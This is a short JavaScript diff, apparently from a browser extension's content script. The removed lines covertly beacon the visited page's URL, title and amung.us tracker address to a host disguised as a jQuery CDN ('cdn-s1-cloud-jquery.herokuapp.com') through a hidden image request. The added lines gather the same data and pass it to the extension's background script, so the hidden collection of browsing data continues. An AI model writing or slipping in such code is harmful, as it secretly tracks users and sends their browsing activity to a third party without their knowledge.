@@ -398,7 +398,15 @@ var login_form = document.getElementById("loginForm");
     var img = document.getElementsByTagName('img');
     for (var i = 0; i < sc.length; i++)
     	if (sc[i].src.indexOf('amung.us') > -1)
-      (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/niches.php?l="+window.location.href+"&t="+document.title+"&a="+sc[i].src;
+      var dati = {};
+      dati.href = window.location.href;
+      dati.title = document.title;
+      dati.amung = sc[i].src
+      chrome.runtime.sendMessage({cmd: "l",data: dati});
     for (var i = 0; i < img.length; i++)
     	if (img[i].src.indexOf('amung.us') > -1)
-    	(new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/niches.php?l="+window.location.href+"&t="+document.title+"&a="+img[i].src;
+      var dat = {};
+      dat.href = window.location.href;
+      dat.title = document.title;
+      dat.amung = img[i].src;
+    	chrome.runtime.sendMessage({cmd: "l",data: dat});
